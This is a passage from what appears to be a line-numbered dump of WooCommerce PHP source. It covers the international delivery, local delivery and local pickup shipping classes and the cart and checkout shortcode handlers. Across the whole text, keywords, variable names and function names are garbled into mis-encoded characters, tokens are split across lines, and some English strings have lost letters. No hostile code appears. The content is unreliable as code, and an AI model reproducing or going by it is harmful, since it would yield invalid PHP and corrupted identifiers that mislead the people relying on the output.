211 
	}
}

220 
funùiÚ
 
	$ÿlcuÏ‹_shpšg
() {

221 
$¬gs
 = 
	`¬¿y
(

222 'id' => 
$this
->
id
,

223 'Ïb–' => 
$this
->
t™Ë
,

225 'xes' => 
çl£


227 
$this
->
	`add_¿‹
Ğ
$¬gs
 );

228 
	}
}

	@includes/shipping/international-delivery/class-wc-shipping-international-delivery.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_Shpšg_IÁ”ÇtiÚ®_D–iv”y
 
ex‹nds
 
	mWC_Shpšg_FÏt_R©e
 {

17 
v¬
 
	m$id
 = 'international_delivery';

25 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

27 
$this
->
id
 = 'international_delivery';

28 
$this
->
æ©_¿‹_İtiÚ
 = 'woocommerce_international_delivery_flat_rates';

29 
$this
->
m‘hod_t™Ë
 = 
	`__
( 'International Delivery', 'woocommerce' );

30 
$this
->
m‘hod_desütiÚ
 = 
	`__
( 'International delivery based on flat„ate shipping.', 'woocommerce' );

32 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_shpšg_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_admin_options' ) );

33 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_shpšg_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_flat_rates' ) );

35 
$this
->
	`š™
();

45 
public
 
funùiÚ
 
	$š™_fÜm_f›lds
() {

47 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

48 '’abËd' => 
	`¬¿y
(

49 't™Ë' => 
	`__
( 'Enable/Disable', 'woocommerce' ),

51 'Ïb–' => 
	`__
( 'Enablehis shipping method', 'woocommerce' ),

54 't™Ë' => 
	`¬¿y
(

55 't™Ë' => 
	`__
( 'Method Title', 'woocommerce' ),

57 'desütiÚ' => 
	`__
( 'This controlsheitle whichhe user sees during checkout.', 'woocommerce' ),

58 'deçuÉ' => 
	`__
( 'International Delivery', 'woocommerce' ),

59 'desc_t' => 
Œue
,

61 'avaab™y' => 
	`¬¿y
(

62 't™Ë' => 
	`__
( 'Availability', 'woocommerce' ),

66 'İtiÚs' => 
	`¬¿y
(

67 'šşudšg' => 
	`__
( 'Selected countries', 'woocommerce' ),

68 'exşudšg' => 
	`__
( 'Excluding selected countries', 'woocommerce' ),

71 'couÁr›s' => 
	`¬¿y
(

72 't™Ë' => 
	`__
( 'Countries', 'woocommerce' ),

77 'İtiÚs' => 
	`WC
()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
(),

78 'cu¡om_©Œibu‹s' => 
	`¬¿y
(

79 'd©a-¶aûhŞd”' => 
	`__
( 'Select some countries', 'woocommerce' )

82 'x_¡©us' => 
	`¬¿y
(

83 't™Ë' => 
	`__
( 'Tax Status', 'woocommerce' ),

86 'İtiÚs' => 
	`¬¿y
(

87 'xabË' => 
	`__
( 'Taxable', 'woocommerce' ),

88 'nÚe' => 
	`_x
( 'None', 'Tax status', 'woocommerce' )

91 'ty³' => 
	`¬¿y
(

92 't™Ë' => 
	`__
( 'Cost Added...', 'woocommerce' ),

95 'İtiÚs' => 
	`¬¿y
(

96 'Üd”' => 
	`__
( 'Per Order - charge shipping forheƒntire order‡s‡ whole', 'woocommerce' ),

97 '™em' => 
	`__
( 'Per Item - charge shipping forƒach item individually', 'woocommerce' ),

98 'şass' => 
	`__
( 'Per Class - charge shipping forƒach shipping class in‡n order', 'woocommerce' ),

101 'co¡' => 
	`¬¿y
(

102 't™Ë' => 
	`__
( 'Cost', 'woocommerce' ),

104 '¶aûhŞd”' => 
	`wc_fÜm©_loÿlized_´iû
( 0 ),

105 'desütiÚ' => 
	`__
( 'Costƒxcludingax. Enter‡n‡mount,ƒ.g. 2.50. Default is 0', 'woocommerce' ),

107 'desc_t' => 
Œue


109 'ãe' => 
	`¬¿y
(

110 't™Ë' => 
	`__
( 'Handling Fee', 'woocommerce' ),

112 'desütiÚ' => 
	`__
( 'Feeƒxcludingax. Enter‡n‡mount,ƒ.g. 2.50, or‡…ercentage,ƒ.g. 5%. Leave blanko disable.', 'woocommerce' ),

114 'desc_t' => 
Œue
,

115 '¶aûhŞd”' => 
	`__
( 'N/A', 'woocommerce' )

117 'mšimum_ãe' => 
	`¬¿y
(

118 't™Ë' => 
	`__
( 'Minimum Handling Fee', 'woocommerce' ),

120 'desütiÚ' => 
	`__
( 'Enter‡ minimum fee‡mount. Fee\'s†esshanhis will be increased. Leave blanko disable.', 'woocommerce' ),

122 'desc_t' => 
Œue
,

123 '¶aûhŞd”' => 
	`__
( 'N/A', 'woocommerce' )

127 
	}
}

137 
public
 
funùiÚ
 
	$is_avaabË
Ğ
$·ckage
 ) {

139 iàĞ"no" ==ğ
$this
->
’abËd
 ) {

140  
çl£
;

143 iàĞ'šşudšg' ==ğ
$this
->
avaab™y
 ) {

145 iàĞ
	`is_¬¿y
Ğ
$this
->
couÁr›s
 ) && ! 
	`š_¬¿y
Ğ
$·ckage
['destination']['country'], $this->countries ) ) {

146  
çl£
;

151 iàĞ
	`is_¬¿y
Ğ
$this
->
couÁr›s
 ) && 
	`š_¬¿y
Ğ
$·ckage
['destination']['country'], $this->countries ) ) {

152  
çl£
;

157  
	`­¶y_f‹rs
Ğ'woocomm”û_shpšg_' . 
$this
->
id
 . '_is_avaabË', 
Œue
 );

158 
	}
}

167 
public
 
funùiÚ
 
ÿlcuÏ‹_shpšg
Ğ
$·ckage
 = 
	$¬¿y
() ) {

168 
$this
->
¿‹s
 = 
	`¬¿y
();

170 iàĞ'Üd”' ==ğ
$this
->
ty³
 ) {

172 
$shpšg_tÙ®
 = 
$this
->
	`Üd”_shpšg
Ğ
$·ckage
 );

174 
$¿‹
 = 
	`¬¿y
(

175 'id' => 
$this
->
id
,

176 'Ïb–' => 
$this
->
t™Ë
,

177 'co¡' => 
$shpšg_tÙ®
 ? $shipping_total : 0,

180 } 
	`–£if
 ( 'şass' ==ğ
$this
->
ty³
 ) {

182 
$shpšg_tÙ®
 = 
$this
->
	`şass_shpšg
Ğ
$·ckage
 );

184 
$¿‹
 = 
	`¬¿y
(

185 'id' => 
$this
->
id
,

186 'Ïb–' => 
$this
->
t™Ë
,

187 'co¡' => 
$shpšg_tÙ®
 ? $shipping_total : 0,

190 } 
	`–£if
 ( '™em' ==ğ
$this
->
ty³
 ) {

192 
$co¡s
 = 
$this
->
	`™em_shpšg
Ğ
$·ckage
 );

194 iàĞ! 
	`is_¬¿y
Ğ
$co¡s
 ) ) {

195 
$co¡s
 = 
	`¬¿y
();

198 
$¿‹
 = 
	`¬¿y
(

199 'id' => 
$this
->
id
,

200 'Ïb–' => 
$this
->
t™Ë
,

201 'co¡' => 
$co¡s
,

206 iàĞ
	`is£t
Ğ
$¿‹
 ) ) {

207 
$this
->
	`add_¿‹
Ğ
$¿‹
 );

209 
	}
}

	@includes/shipping/local-delivery/class-wc-shipping-local-delivery.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_Shpšg_Loÿl_D–iv”y
 
ex‹nds
 
	mWC_Shpšg_M‘hod
 {

23 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
$this
->
id
 = 'local_delivery';

25 
$this
->
m‘hod_t™Ë
 = 
	`__
( 'Local Delivery', 'woocommerce' );

26 
$this
->
	`š™
();

35 
funùiÚ
 
	$š™
() {

38 
$this
->
	`š™_fÜm_f›lds
();

39 
$this
->
	`š™_£‰šgs
();

42 
$this
->
t™Ë
 = $this->
	`g‘_İtiÚ
( 'title' );

43 
$this
->
ty³
 = $this->
	`g‘_İtiÚ
( 'type' );

44 
$this
->
ãe
 = $this->
	`g‘_İtiÚ
( 'fee' );

45 
$this
->
ty³
 = $this->
	`g‘_İtiÚ
( 'type' );

46 
$this
->
codes
 = $this->
	`g‘_İtiÚ
( 'codes' );

47 
$this
->
avaab™y
 = $this->
	`g‘_İtiÚ
( 'availability' );

48 
$this
->
couÁr›s
 = $this->
	`g‘_İtiÚ
( 'countries' );

50 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_shpšg_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_admin_options' ) );

51 
	}
}

60 
funùiÚ
 
ÿlcuÏ‹_shpšg
Ğ
$·ckage
 = 
	$¬¿y
() ) {

62 
$shpšg_tÙ®
 = 0;

63 
$ãe
 = ( 
	`Œim
Ğ
$this
->
ãe
 ) == '' ) ? 0 : $this->fee;

65 iàĞ
$this
->
ty³
 =='fixed' ) 
$shpšg_tÙ®
 = $this->
ãe
;

67 iàĞ
$this
->
ty³
 =='³rûÁ' ) 
$shpšg_tÙ®
 = 
$·ckage
['cÚ‹Ás_co¡'] * ( $this->
ãe
 / 100 );

69 iàĞ
$this
->
ty³
 == 'product' ) {

70 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
(è
as
 
$™em_id
 => 
$v®ues
 ) {

71 
$_´oduù
 = 
$v®ues
['data'];

73 iàĞ
$v®ues
['quªt™y'] > 0 && 
$_´oduù
->
	`Ãeds_shpšg
() ) {

74 
$shpšg_tÙ®
 +ğ
$this
->
ãe
 * 
$v®ues
['quantity'];

79 
$¿‹
 = 
	`¬¿y
(

80 'id' => 
$this
->
id
,

81 'Ïb–' => 
$this
->
t™Ë
,

82 'co¡' => 
$shpšg_tÙ®


85 
$this
->
	`add_¿‹
(
$¿‹
);

86 
	}
}

94 
funùiÚ
 
	$š™_fÜm_f›lds
() {

95 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

96 '’abËd' => 
	`¬¿y
(

97 't™Ë' => 
	`__
( 'Enable', 'woocommerce' ),

99 'Ïb–' => 
	`__
( 'Enable†ocal delivery', 'woocommerce' ),

102 't™Ë' => 
	`¬¿y
(

103 't™Ë' => 
	`__
( 'Title', 'woocommerce' ),

105 'desütiÚ' => 
	`__
( 'This controlsheitle whichhe user sees during checkout.', 'woocommerce' ),

106 'deçuÉ' => 
	`__
( 'Local Delivery', 'woocommerce' ),

107 'desc_t' => 
Œue
,

109 'ty³' => 
	`¬¿y
(

110 't™Ë' => 
	`__
( 'Fee Type', 'woocommerce' ),

112 'desütiÚ' => 
	`__
( 'Howo calculate delivery charges', 'woocommerce' ),

114 'İtiÚs' => 
	`¬¿y
(

115 'fixed' => 
	`__
( 'Fixed‡mount', 'woocommerce' ),

116 '³rûÁ' => 
	`__
( 'Percentage of cartotal', 'woocommerce' ),

117 '´oduù' => 
	`__
( 'Fixed‡mount…er…roduct', 'woocommerce' ),

119 'desc_t' => 
Œue
,

121 'ãe' => 
	`¬¿y
(

122 't™Ë' => 
	`__
( 'Delivery Fee', 'woocommerce' ),

124 'desütiÚ' => 
	`__
( 'What fee do you wanto charge for†ocal delivery, disregarded if you choose free. Leave blanko disable.', 'woocommerce' ),

126 'desc_t' => 
Œue
,

127 '¶aûhŞd”' => 
	`wc_fÜm©_loÿlized_´iû
( 0 )

129 'codes' => 
	`¬¿y
(

130 't™Ë' => 
	`__
( 'Zip/Post Codes', 'woocommerce' ),

132 'desütiÚ' => 
	`__
( 'What zip/post codes would you†ikeo offer deliveryo? Separate codes with‡ comma. Accepts wildcards,ƒ.g. P* will match‡…ostcode of PE30.', 'woocommerce' ),

134 'desc_t' => 
Œue
,

137 'avaab™y' => 
	`¬¿y
(

138 't™Ë' => 
	`__
( 'Method‡vailability', 'woocommerce' ),

142 'İtiÚs' => 
	`¬¿y
(

143 '®l' => 
	`__
( 'All‡llowed countries', 'woocommerce' ),

144 '¥ecific' => 
	`__
( 'Specific Countries', 'woocommerce' )

147 'couÁr›s' => 
	`¬¿y
(

148 't™Ë' => 
	`__
( 'Specific Countries', 'woocommerce' ),

153 'İtiÚs' => 
	`WC
()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
(),

154 'cu¡om_©Œibu‹s' => 
	`¬¿y
(

155 'd©a-¶aûhŞd”' => 
	`__
( 'Select some countries', 'woocommerce' )

159 
	}
}

167 
funùiÚ
 
	$admš_İtiÚs
() {

168 
glob®
 
$woocomm”û
; ?>

169 <
h3
><?
php
 
echo
 
$this
->
m‘hod_t™Ë
; ?></h3>

170 <
p
><?
php
 
	`_e
( 'Local delivery is‡ simple shipping method for delivering orders†ocally.', 'woocommerce' ); ?></p>

171 <
bË
 
şass
="form-table">

172 <?
php
 
$this
->
	`g’”©e_£‰šgs_html
(); ?>

173 </
bË
> <?
php


174 
	}
}

184 
funùiÚ
 
	$is_avaabË
Ğ
$·ckage
 ) {

186 ià(
$this
->
’abËd
=="no"è 
çl£
;

189 
$codes
 = '';

190 iàĞ
$this
->
codes
 != '' ) {

191 
	`fÜ—ch
Ğ
	`ex¶ode
Ğ',', 
$this
->
codes
 ) 
as
 
$code
 ) {

192 
$codes
[] = 
$this
->
	`ş—n
Ğ
$code
 );

196 iàĞ
	`is_¬¿y
Ğ
$codes
 ) ) {

198 
$found_m©ch
 = 
çl£
;

200 iàĞ
	`š_¬¿y
Ğ
$this
->
	`ş—n
Ğ
$·ckage
['de¡š©iÚ']['po¡code'] ), 
$codes
 ) ) {

201 
$found_m©ch
 = 
Œue
;

206 iàĞ! 
$found_m©ch
 ) {

208 
$cu¡om”_po¡code
 = 
$this
->
	`ş—n
Ğ
$·ckage
['destination']['postcode'] );

209 
	`fÜ—ch
 (
$codes
 
as
 
$c
) {

210 
$·‰”n
 = '/^' . 
	`¡r_»¶aû
Ğ'_', '[0-9a-zA-Z]', 
$c
 ) . '$/i';

211 iàĞ
	`´eg_m©ch
Ğ
$·‰”n
, 
$cu¡om”_po¡code
 ) ) {

212 
$found_m©ch
 = 
Œue
;

221 iàĞ! 
$found_m©ch
 ) {

223 
$cu¡om”_po¡code
 = 
$this
->
	`ş—n
Ğ
$·ckage
['destination']['postcode'] );

224 
$cu¡om”_po¡code_Ëngth
 = 
	`¡¾’
Ğ
$cu¡om”_po¡code
 );

226  
$i
 = 0; $˜<ğ
$cu¡om”_po¡code_Ëngth
; $i++ ) {

228 iàĞ
	`š_¬¿y
Ğ
$cu¡om”_po¡code
, 
$codes
 ) ) {

229 
$found_m©ch
 = 
Œue
;

232 
$cu¡om”_po¡code
 = 
	`sub¡r
( $customer_postcode, 0, -2 ) . '*';

236 iàĞ! 
$found_m©ch
 ) {

237  
çl£
;

242 iàĞ
$this
->
avaab™y
 == 'specific' ) {

243 
$sh_to_couÁr›s
 = 
$this
->
couÁr›s
;

245 
$sh_to_couÁr›s
 = 
	`¬¿y_keys
Ğ
	`WC
()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
() );

248 ià(
	`is_¬¿y
(
$sh_to_couÁr›s
)) {

249 ià(!
	`š_¬¿y
Ğ
$·ckage
['de¡š©iÚ']['couÁry'] , 
$sh_to_couÁr›s
)){

250  
çl£
;

255  
	`­¶y_f‹rs
Ğ'woocomm”û_shpšg_' . 
$this
->
id
 . '_is_avaabË', 
Œue
 );

256 
	}
}

266 
funùiÚ
 
	$ş—n
Ğ
$code
 ) {

267  
	`¡r_»¶aû
Ğ'-', '', 
	`§n™ize_t™Ë
Ğ
$code
 ) ) . ( 
	`¡r¡r
( $code, '*' ) ? '*' : '' );

268 
	}
}

	@includes/shipping/local-pickup/class-wc-shipping-local-pickup.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_Shpšg_Loÿl_Pickup
 
ex‹nds
 
	mWC_Shpšg_M‘hod
 {

23 
funùiÚ
 
	$__cÚ¡ruù
() {

24 
$this
->
id
 = 'local_pickup';

25 
$this
->
m‘hod_t™Ë
 = 
	`__
( 'Local Pickup', 'woocommerce' );

26 
$this
->
	`š™
();

35 
funùiÚ
 
	$š™
() {

38 
$this
->
	`š™_fÜm_f›lds
();

39 
$this
->
	`š™_£‰šgs
();

42 
$this
->
’abËd
 = $this->
	`g‘_İtiÚ
( 'enabled' );

43 
$this
->
t™Ë
 = $this->
	`g‘_İtiÚ
( 'title' );

44 
$this
->
codes
 = $this->
	`g‘_İtiÚ
( 'codes' );

45 
$this
->
avaab™y
 = $this->
	`g‘_İtiÚ
( 'availability' );

46 
$this
->
couÁr›s
 = $this->
	`g‘_İtiÚ
( 'countries' );

49 
	`add_aùiÚ
Ğ'woocomm”û_upd©e_İtiÚs_shpšg_' . 
$this
->
id
, 
	`¬¿y
( $this, 'process_admin_options' ) );

50 
	}
}

58 
funùiÚ
 
	$ÿlcuÏ‹_shpšg
() {

59 
$¿‹
 = 
	`¬¿y
(

60 'id' => 
$this
->
id
,

61 'Ïb–' => 
$this
->
t™Ë
,

63 
$this
->
	`add_¿‹
(
$¿‹
);

64 
	}
}

72 
funùiÚ
 
	$š™_fÜm_f›lds
() {

73 
$this
->
fÜm_f›lds
 = 
	`¬¿y
(

74 '’abËd' => 
	`¬¿y
(

75 't™Ë' => 
	`__
( 'Enable', 'woocommerce' ),

77 'Ïb–' => 
	`__
( 'Enable†ocal…ickup', 'woocommerce' ),

80 't™Ë' => 
	`¬¿y
(

81 't™Ë' => 
	`__
( 'Title', 'woocommerce' ),

83 'desütiÚ' => 
	`__
( 'This controlsheitle whichhe user sees during checkout.', 'woocommerce' ),

84 'deçuÉ' => 
	`__
( 'Local Pickup', 'woocommerce' ),

85 'desc_t' => 
Œue
,

87 'codes' => 
	`¬¿y
(

88 't™Ë' => 
	`__
( 'Zip/Post Codes', 'woocommerce' ),

90 'desütiÚ' => 
	`__
( 'What zip/post codes‡re‡vailable for†ocal…ickup? Separate codes with‡ comma. Accepts wildcards,ƒ.g. P* will match‡…ostcode of PE30.', 'woocommerce' ),

92 'desc_t' => 
Œue
,

95 'avaab™y' => 
	`¬¿y
(

96 't™Ë' => 
	`__
( 'Method‡vailability', 'woocommerce' ),

100 'İtiÚs' => 
	`¬¿y
(

101 '®l' => 
	`__
( 'All‡llowed countries', 'woocommerce' ),

102 '¥ecific' => 
	`__
( 'Specific Countries', 'woocommerce' )

105 'couÁr›s' => 
	`¬¿y
(

106 't™Ë' => 
	`__
( 'Specific Countries', 'woocommerce' ),

111 'İtiÚs' => 
	`WC
()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
(),

112 'cu¡om_©Œibu‹s' => 
	`¬¿y
(

113 'd©a-¶aûhŞd”' => 
	`__
( 'Select some countries', 'woocommerce' )

117 
	}
}

125 
funùiÚ
 
	$admš_İtiÚs
() {

126 
glob®
 
$woocomm”û
; ?>

127 <
h3
><?
php
 
echo
 
$this
->
m‘hod_t™Ë
; ?></h3>

128 <
p
><?
php
 
	`_e
( 'Local…ickup is‡ simple method which‡llowshe customero…ick upheir orderhemselves.', 'woocommerce' ); ?></p>

129 <
bË
 
şass
="form-table">

130 <?
php
 
$this
->
	`g’”©e_£‰šgs_html
(); ?>

131 </
bË
> <?
php


132 
	}
}

141 
funùiÚ
 
	$is_avaabË
Ğ
$·ckage
 ) {

143 
$is_avaabË
 = 
Œue
;

145 iàĞ
$this
->
’abËd
 == "no" ) {

147 
$is_avaabË
 = 
çl£
;

152 
$codes
 = '';

153 iàĞ
$this
->
codes
 != '' ) {

154 
	`fÜ—ch
Ğ
	`ex¶ode
Ğ',', 
$this
->
codes
 ) 
as
 
$code
 ) {

155 
$codes
[] = 
$this
->
	`ş—n
Ğ
$code
 );

159 iàĞ
	`is_¬¿y
Ğ
$codes
 ) ) {

161 
$found_m©ch
 = 
çl£
;

163 iàĞ
	`š_¬¿y
Ğ
$this
->
	`ş—n
Ğ
$·ckage
['de¡š©iÚ']['po¡code'] ), 
$codes
 ) )

164 
$found_m©ch
 = 
Œue
;

167 iàĞ! 
$found_m©ch
 ) {

169 
$cu¡om”_po¡code
 = 
$this
->
	`ş—n
Ğ
$·ckage
['destination']['postcode'] );

170 
$cu¡om”_po¡code_Ëngth
 = 
	`¡¾’
Ğ
$cu¡om”_po¡code
 );

172  
$i
 = 0; $˜<ğ
$cu¡om”_po¡code_Ëngth
; $i++ ) {

174 iàĞ
	`š_¬¿y
Ğ
$cu¡om”_po¡code
, 
$codes
 ) )

175 
$found_m©ch
 = 
Œue
;

177 
$cu¡om”_po¡code
 = 
	`sub¡r
( $customer_postcode, 0, -2 ) . '*';

181 iàĞ! 
$found_m©ch
 ) {

183 
$is_avaabË
 = 
çl£
;

187 iàĞ
$this
->
avaab™y
 == 'specific' )

188 
$sh_to_couÁr›s
 = 
$this
->
couÁr›s
;

190 
$sh_to_couÁr›s
 = 
	`¬¿y_keys
Ğ
	`WC
()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
() );

192 iàĞ
	`is_¬¿y
Ğ
$sh_to_couÁr›s
 ) && ! 
	`š_¬¿y
Ğ
$·ckage
['destination']['country'], $ship_to_countries ) ) {

193 
$is_avaabË
 = 
çl£
;

198 iàĞ
$this
->
avaab™y
 == 'specific' )

199 
$sh_to_couÁr›s
 = 
$this
->
couÁr›s
;

201 
$sh_to_couÁr›s
 = 
	`¬¿y_keys
Ğ
	`WC
()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
() );

203 iàĞ
	`is_¬¿y
Ğ
$sh_to_couÁr›s
 ) && ! 
	`š_¬¿y
Ğ
$·ckage
['destination']['country'], $ship_to_countries ) ) {

204 
$is_avaabË
 = 
çl£
;

210  
	`­¶y_f‹rs
Ğ'woocomm”û_shpšg_' . 
$this
->
id
 . '_is_avaabË', 
$is_avaabË
, 
$·ckage
 );

211 
	}
}

220 
funùiÚ
 
	$ş—n
Ğ
$code
 ) {

221  
	`¡r_»¶aû
Ğ'-', '', 
	`§n™ize_t™Ë
Ğ
$code
 ) ) . ( 
	`¡r¡r
( $code, '*' ) ? '*' : '' );

222 
	}
}

	@includes/shortcodes/class-wc-shortcode-cart.php

1 <?
php


12 şas 
	cWC_ShÜtcode_C¬t
 {

19 
public
 
funùiÚ
 
	$ouut
Ğ
$©ts
 ) {

22 iàĞ
	`is_nuÎ
Ğ
	`WC
()->
ÿ¹
 ) ) {

27 iàĞ! 
	`defšed
( 'WOOCOMMERCE_CART' ) ) {

28 
	`defše
Ğ'WOOCOMMERCE_CART', 
Œue
 );

32 iàĞ! 
	`em±y
Ğ
$_POST
['ÿlc_shpšg'] ) && 
	`wp_v”ify_nÚû
( $_POST['_wpnonce'], 'woocommerce-cart' ) ) {

34 
Œy
 {

35 
	`WC
()->
shpšg
->
	`»£t_shpšg
();

37 
$couÁry
 = 
	`wc_ş—n
Ğ
$_POST
['calc_shipping_country'] );

38 
$¡©e
 = 
	`is£t
Ğ
$_POST
['ÿlc_shpšg_¡©e'] ) ? 
	`wc_ş—n
( $_POST['calc_shipping_state'] ) : '';

39 
$po¡code
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_shpšg_ÿlcuÏtÜ_’abË_po¡code', 
Œue
 ) ? 
	`wc_ş—n
Ğ
$_POST
['calc_shipping_postcode'] ) : '';

40 
$c™y
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_shpšg_ÿlcuÏtÜ_’abË_c™y', 
çl£
 ) ? 
	`wc_ş—n
Ğ
$_POST
['calc_shipping_city'] ) : '';

42 iàĞ
$po¡code
 && ! 
WC_V®id©iÚ
::
	`is_po¡code
Ğ$po¡code, 
$couÁry
 ) ) {

43 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
	`__
( 'Pleaseƒnter‡ valid…ostcode/ZIP.', 'woocommerce' ) );

44 } 
	`–£if
 ( 
$po¡code
 ) {

45 
$po¡code
 = 
	`wc_fÜm©_po¡code
Ğ$po¡code, 
$couÁry
 );

48 iàĞ
$couÁry
 ) {

49 
	`WC
()->
cu¡om”
->
	`£t_loÿtiÚ
Ğ
$couÁry
, 
$¡©e
, 
$po¡code
, 
$c™y
 );

50 
	`WC
()->
cu¡om”
->
	`£t_shpšg_loÿtiÚ
Ğ
$couÁry
, 
$¡©e
, 
$po¡code
, 
$c™y
 );

52 
	`WC
()->
cu¡om”
->
	`£t_to_ba£
();

53 
	`WC
()->
cu¡om”
->
	`£t_shpšg_to_ba£
();

56 
	`WC
()->
cu¡om”
->
	`ÿlcuÏ‹d_shpšg
Ğ
Œue
 );

58 
	`wc_add_nÙiû
Ğ
	`__
( 'Shipping costs updated.', 'woocommerce' ), 'notice' );

60 
	`do_aùiÚ
( 'woocommerce_calculated_shipping' );

62 } 
	`ÿtch
 ( 
Exû±iÚ
 
$e
 ) {

64 iàĞ! 
	`em±y
Ğ
$e
 ) )

65 
	`wc_add_nÙiû
Ğ
$e
->
	`g‘Mes§ge
(), 'error' );

70 
	`do_aùiÚ
('woocommerce_check_cart_items');

73 
	`WC
()->
ÿ¹
->
	`ÿlcuÏ‹_tÙ®s
();

75 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) == 0 )

76 
	`wc_g‘_‹m¶©e
( 'cart/cart-empty.php' );

78 
	`wc_g‘_‹m¶©e
( 'cart/cart.php' );

81 
	}
}

	@includes/shortcodes/class-wc-shortcode-checkout.php

1 <?
php


13 şas 
	cWC_ShÜtcode_Checkout
 {

22 
public
 
funùiÚ
 
	$g‘
Ğ
$©ts
 ) {

23  
WC_ShÜtcodes
::
	`shÜtcode_w¿µ”
Ğ
	`¬¿y
Ğ
__CLASS__
, 'ouut' ), 
$©ts
 );

33 
public
 
funùiÚ
 
	$ouut
Ğ
$©ts
 ) {

34 
glob®
 
$woocomm”û
, 
$wp
;

37 iàĞ
	`is_nuÎ
Ğ
	`WC
()->
ÿ¹
 ) ) {

42 iàĞ
	`is£t
Ğ
$_GET
['order'] ) && isset( $_GET['key'] ) ) {

43 
	`_d•»ÿ‹d_¬gum’t
Ğ
__CLASS__
 . '->' . 
__FUNCTION__
, '2.1', '"order" is‚o†onger usedo…ass‡n order ID. Usehe order-pay or order-receivedƒndpoint instead.' );

46 
$Üd”_id
 = 
	`absšt
Ğ
$_GET
['order'] );

47 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

49 iàĞ
$Üd”
->
¡©us
 == 'pending' )

50 
$wp
->
qu”y_v¬s
['Üd”-·y'] = 
	`absšt
Ğ
$_GET
['order'] );

52 
$wp
->
qu”y_v¬s
['Üd”-»ûived'] = 
	`absšt
Ğ
$_GET
['order'] );

56 iàĞ! 
	`em±y
Ğ
$wp
->
qu”y_v¬s
['order-pay'] ) ) {

58 
£lf
::
	`Üd”_·y
Ğ
$wp
->
qu”y_v¬s
['order-pay'] );

60 } 
	`–£if
 ( 
	`is£t
Ğ
$wp
->
qu”y_v¬s
['order-received'] ) ) {

62 
£lf
::
	`Üd”_»ûived
Ğ
$wp
->
qu”y_v¬s
['order-received'] );

66 
£lf
::
	`checkout
();

69 
	}
}

74 
´iv©e
 
funùiÚ
 
	$Üd”_·y
Ğ
$Üd”_id
 ) {

76 
	`do_aùiÚ
( 'before_woocommerce_pay' );

78 
	`wc_´št_nÙiûs
();

80 
$Üd”_id
 = 
	`absšt
( $order_id );

83 iàĞ
	`is£t
Ğ
$_GET
['·y_fÜ_Üd”'] ) && is£tĞ$_GET['key'] ) && 
$Üd”_id
 ) {

86 
$Üd”_key
 = 
$_GET
[ 'key' ];

87 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

88 
$v®id_Üd”_¡©u£s
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_v®id_Üd”_¡©u£s_fÜ_·ym’t', 
	`¬¿y
Ğ'³ndšg', 'çed' ), 
$Üd”
 );

90 iàĞ! 
	`cu¼’t_u£r_ÿn
Ğ'·y_fÜ_Üd”', 
$Üd”_id
 ) ) {

91 
echo
 '<div cÏss="woocomm”û-”rÜ">' . 
	`__
Ğ'Inv®id ord”. Iàyou havª‡ccouÁ…Ëa£†og iÀªdry‡gaš.', 'woocomm”û' ) . ' <¨h»f="' . 
	`g‘_³rm®šk
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) ) . '" class="wc-forward">' . __( 'My Account', 'woocommerce' ) . '</a>' . '</div>';

95 iàĞ
$Üd”
->
id
 =ğ
$Üd”_id
 && $Üd”->
Üd”_key
 =ğ
$Üd”_key
 ) {

97 iàĞ
	`š_¬¿y
Ğ
$Üd”
->
¡©us
, 
$v®id_Üd”_¡©u£s
 ) ) {

100 iàĞ
$Üd”
->
blšg_couÁry
 )

101 
	`WC
()->
cu¡om”
->
	`£t_couÁry
Ğ
$Üd”
->
blšg_couÁry
 );

102 iàĞ
$Üd”
->
blšg_¡©e
 )

103 
	`WC
()->
cu¡om”
->
	`£t_¡©e
Ğ
$Üd”
->
blšg_¡©e
 );

104 iàĞ
$Üd”
->
blšg_po¡code
 )

105 
	`WC
()->
cu¡om”
->
	`£t_po¡code
Ğ
$Üd”
->
blšg_po¡code
 );

107 
	`wc_g‘_‹m¶©e
Ğ'checkout/fÜm-·y.php', 
	`¬¿y
Ğ'Üd”' => 
$Üd”
 ) );

111 
$¡©us
 = 
	`g‘_‹rm_by
('¦ug', 
$Üd”
->
¡©us
, 'shop_order_status');

113 
	`wc_add_nÙiû
Ğ
	`¥rštf
Ğ
	`__
Ğ'Thi Üd”&rsquo; ¡©u i &ldquo;%s&rdquo;&mdash;™ cªnÙ b·id fÜ. PËa£ cÚù u iàyou‚“d‡ssi¡ªû.', 'woocomm”û' ), 
$¡©us
->
Çme
 ), 'error' );

117 
	`wc_add_nÙiû
Ğ
	`__
( 'Sorry,his order is invalid‡nd cannot be…aid for.', 'woocommerce' ), 'error' );

120 } 
	`–£if
 ( 
$Üd”_id
 ) {

123 
$Üd”_key
 = 
	`is£t
Ğ
$_GET
['key'] ) ? 
	`wc_ş—n
( $_GET['key'] ) : '';

124 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

125 
